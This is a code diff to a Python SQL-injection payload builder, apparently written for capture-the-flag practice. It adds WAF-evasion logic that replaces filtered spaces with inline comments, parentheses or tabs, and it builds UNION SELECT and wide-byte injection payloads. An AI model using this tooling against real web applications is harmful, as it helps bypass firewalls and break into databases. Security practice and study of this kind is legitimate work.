@@ -9,8 +9,8 @@
 from __future__ import annotations
 
 from .models import InjectionPoint, WafReport
-from ..tampers import (apply_form, comma_free, form_sep, mixed_case,
-                       or_inject, to_hex_literal)
+from ..tampers import (apply_form, auto_space, comma_free, form_sep,
+                       mixed_case, or_inject, to_hex_literal)
 
 
 class PayloadBuilder:
@@ -73,6 +73,12 @@ class PayloadBuilder:
             sql = apply_form(sql, form)
         if self.waf.is_filtered(","):
             sql = comma_free(sql)
+        # 空格被滤而 form 未升级（union-first 命中路径 form 仍是 classic）时，
+        # 按 WAF 符号实测自动降级分隔符：/**/ 可用 → 内联；* 同被滤 → 括号法；
+        # 括号也被滤 → tab（web209：space/*/= 三字符同拦）
+        if " " in sql and self.waf.is_filtered("space"):
+            sql = auto_space(sql, self.waf.is_filtered("/*", "*/", "*"),
+                             self.waf.is_filtered("(", ")"))
         # WAF 扫描实测「大小写混淆可用」→ 关键字全部混合大小写
         if any("大小写混淆可用" in i.evidence for i in self.waf.items):
             sql = mixed_case(sql)
@@ -97,9 +103,10 @@ class PayloadBuilder:
         return pre + self.transform(core) + self.inj.tail_literal()
 
     def union_row(self, exprs: list) -> str:
-        """构造 union select 一行（exprs 为各列表达式，null 占位）。"""
-        select_kw = "union/**/select/**/" if self.waf.is_filtered("space") else "union select "
-        return self.wrap(select_kw + ",".join(exprs), base_value="0")
+        """构造 union select 一行（exprs 为各列表达式，null 占位）。
+
+        空格分隔符交给 transform() 按 WAF 实测自动降级（/**//括号/tab）。"""
+        return self.wrap("union select " + ",".join(exprs), base_value="0")
 
     def widebyte_prefix(self) -> str:
         """宽字节 payload 的前缀（\xdf + 闭合）。"""
